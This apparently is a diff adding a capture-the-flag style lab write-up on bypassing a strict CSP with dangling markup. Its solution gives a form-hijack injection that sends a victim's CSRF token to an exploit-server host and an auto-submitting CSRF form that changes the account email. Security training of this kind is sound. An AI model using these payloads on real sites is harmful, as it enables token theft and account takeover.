@@ -1,0 +1,48 @@
+// Lab: Reflected XSS protected by very strict CSP, with dangling markup attack
+
+
+This lab uses a strict CSP that prevents the browser from loading subresources from external domains.
+
+To solve the lab, perform a form hijacking attack that bypasses the CSP, exfiltrates the simulated victim user's CSRF token, and uses it to authorize changing the email to hacker@evil-user.net.
+
+You must label your vector with the word "Click" in order to induce the simulated user to click it. For example:
+
+<a href="">Click me</a>
+
+You can log in to your own account using the following credentials: wiener:peter
+
+
+
+
+// Solution
+
+CSP blocks eventHandlers, external javascript, and script tags
+
+
+// putting this is URL to check Content security policy
+
+&email=cybersecradar"></form><form class"login_form" name="myform" action="https://exploit-0a9b00ce0300667f806e0c41012700db.exploit-server.net/exploit" method="GET"><button class="button" type="submit">Clickme</button
+
+
+// Inject this payload to get the user CSRF token
+
+<script>
+    location='https://0a38007f032f660280bb0d9400bc0075.web-security-academy.net/my-account?email="></form><form class"login_form" name="myform" action="https://exploit-0a9b00ce0300667f806e0c41012700db.exploit-server.net/exploit" method="GET"><button class="button" type="submit">Clickme</button'
+</script>
+
+
+// Now Inject this exploit in exploit server to solve the lab
+
+<html>
+    <body>
+        <form action="https://0a38007f032f660280bb0d9400bc0075.web-security-academy.net/my-account/change-email" method="post">
+            <input type="hidden" name="email" value="hacker@evil-user.net"/>
+            <input type="hidden" name="csrf" value="ZRSHNR1bePdn9f8dYovktxdDif6tfyLX"/>
+            <input type="submit" value="submit"/>
+        </form>
+        <script>
+            history.pushState('', '', '/');  // modify the browser history state and change the url to /
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
